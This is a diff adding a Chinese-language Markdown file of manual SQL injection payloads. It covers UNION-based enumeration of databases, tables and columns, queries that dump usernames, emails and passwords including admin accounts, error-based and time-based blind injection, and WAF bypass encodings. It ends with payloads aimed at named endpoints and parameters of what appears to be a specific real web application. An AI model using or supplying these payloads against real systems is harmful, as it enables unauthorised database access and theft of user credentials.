@@ -1,0 +1,148 @@
+# SQL注入手动Payload集合
+
+## Union注入测试
+
+### 1. 测试列数
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+
+### 2. 提取数据库版本
+1' UNION SELECT NULL,version(),NULL--
+1' UNION SELECT NULL,NULL,version()--
+1' UNION SELECT version(),NULL,NULL--
+
+### 3. 提取数据库名
+1' UNION SELECT NULL,database(),NULL--
+1' UNION SELECT NULL,NULL,database()--
+1' UNION SELECT database(),NULL,NULL--
+
+### 4. 提取当前用户
+1' UNION SELECT NULL,user(),NULL--
+1' UNION SELECT NULL,NULL,user()--
+1' UNION SELECT user(),NULL,NULL--
+
+## 表名提取
+
+### 5. 提取所有表名
+1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
+1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1--
+1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1--
+
+### 6. 提取指定表名（用户相关）
+1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%user%'--
+1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%account%'--
+1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%admin%'--
+1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%customer%'--
+
+## 列名提取
+
+### 7. 提取指定表的列名
+1' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+1' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='Account'--
+1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 0,1--
+1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1,1--
+
+### 8. 提取密码列
+1' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%pass%'--
+1' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='Account' AND column_name LIKE '%pass%'--
+
+## 数据提取
+
+### 9. 提取用户凭证
+1' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users LIMIT 0,10--
+1' UNION SELECT NULL,CONCAT(UserName,':',Password),NULL FROM Account LIMIT 0,10--
+1' UNION SELECT NULL,CONCAT(MobileNumber,':',Password),NULL FROM User LIMIT 0,10--
+1' UNION SELECT NULL,CONCAT(Email,':',Password),NULL FROM Users LIMIT 0,10--
+1' UNION SELECT NULL,CONCAT(ID,':',UserName,':',Password),NULL FROM Account LIMIT 0,10--
+
+### 10. 提取所有用户数据
+1' UNION SELECT NULL,CONCAT(id,':',username,':',email,':',password),NULL FROM users LIMIT 0,100--
+
+### 11. 提取管理员账户
+1' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users WHERE role='admin'--
+1' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM Account WHERE EmployeeLevel='ADMIN'--
+
+## 报错注入Payload
+
+### 12. 提取版本（报错）
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
+1' AND updatexml(1, CONCAT(0x7e, (SELECT version()), 0x7e), 1)--
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+### 13. 提取数据库名（报错）
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
+1' AND updatexml(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+### 14. 提取表名（报错）
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))--
+1' AND updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e), 1)--
+
+### 15. 提取列名（报错）
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'), 0x7e))--
+1' AND updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'), 0x7e), 1)--
+
+## 时间盲注Payload
+
+### 16. 时间延迟测试
+1' AND SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(5))--
+
+### 17. 条件时间盲注
+1' AND IF(1=1,SLEEP(5),0)--
+1' AND IF(1=2,SLEEP(5),0)--
+1' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
+1' AND IF((SELECT LENGTH(database()))>0,SLEEP(5),0)--
+
+## WAF绕过Payload
+
+### 18. 注释绕过
+1'/**/OR/**/'1'='1
+1'/*comment*/OR/*comment*/'1'='1
+1'--%0AOR--%0A'1'='1
+1'#%0AOR#%0A'1'='1
+
+### 19. 大小写绕过
+1' Or '1'='1
+1' oR '1'='1
+1' OR '1'='1
+
+### 20. 编码绕过
+1%27%20OR%20%271%27%3D%271
+1'%20OR%20'1'='1
+%31%27%20%4F%52%20%27%31%27%3D%27%31
+
+### 21. 空格绕过
+1'/**/OR/**/'1'='1
+1'%09OR%09'1'='1
+1'%0AOR%0A'1'='1
+1'%0DOR%0D'1'='1
+
+### 22. 函数绕过
+1' OR CHAR(49)=CHAR(49)--
+1' OR ASCII('1')=49--
+1' OR UNICODE('1')=49--
+
+## 目标端点测试
+
+### /Handle/SearchListProvince
+Type=1' UNION SELECT NULL,version(),NULL--
+Type=1' UNION SELECT NULL,database(),NULL--
+Type=1' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+
+### /Handle/SearchListWardByDistrictID
+DistrictID=1' UNION SELECT NULL,version(),NULL--
+DistrictID=1' UNION SELECT NULL,database(),NULL--
+
+### /Handle/SearchListCustomer
+q=1' UNION SELECT NULL,version(),NULL--
+search=1' UNION SELECT NULL,version(),NULL--
+
+### /Account/GetUserInfo
+id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
+id=1' AND updatexml(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--
